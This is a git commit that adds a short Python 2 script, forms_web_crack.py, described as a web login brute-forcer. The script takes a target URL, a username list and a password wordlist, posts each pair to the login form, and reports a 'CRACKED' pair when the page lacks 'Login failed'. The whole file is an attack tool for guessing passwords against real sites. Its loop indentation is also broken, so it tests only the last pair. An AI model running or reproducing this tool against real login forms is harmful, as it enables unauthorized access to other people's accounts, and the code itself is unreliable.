f29df1dfb0aa22ea4326aec824f381f780341f25
Leandro B Pereira <leandrobatistapereira98@gmail.com>
2016-09-26 21:44:02 -0300

    Web brute force write in python

---
+++ forms_web_crack.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+from colorama import Fore, init
+import requests
+import sys
+init(autoreset=True)
+
+url = sys.argv[1]
+lista_user = sys.argv[2]
+wordlist = sys.argv[3]
+lista = open(lista_user, 'r').readlines()
+word = open(wordlist, 'r').readlines()
+
+for users in lista:
+    users = users.rstrip()
+    for passwd in word:
+        passwd = passwd.rstrip()
+dados = {'username': users, 'password': passwd}
+r = requests.post(url, data=dados, allow_redirects=True)
+if "Login failed" in r.text:
+    print Fore.BLUE + "TESTANDO..."
+
+    print Fore.RED + "Usuario: %s\nSenha: %s" % (users, passwd)
+else:
+    print Fore.YELLOW + "\O/ BAZINGA \O/\n"
+
+    print Fore.GREEN + "[+]CRACKED: %s %s" % (users, passwd)
